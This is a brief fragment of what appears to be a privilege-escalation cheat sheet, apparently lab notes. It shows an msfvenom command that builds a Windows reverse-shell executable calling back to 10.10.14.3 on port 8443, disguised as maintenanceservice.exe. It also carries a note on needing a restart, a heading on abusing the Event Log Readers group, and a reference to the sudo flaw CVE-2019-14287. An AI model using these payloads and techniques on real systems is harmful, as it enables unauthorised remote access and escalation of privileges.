...
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
...
#The only catch here is the system needs to be restarted or the user need to login again
```
...
```
### Abusing Event Log Readers Group
```
...
CVE-2019-14287 sudo < 1.8.28 (prerequisite - It had to allow a user in the /etc/sudoers file to execute a specific command)
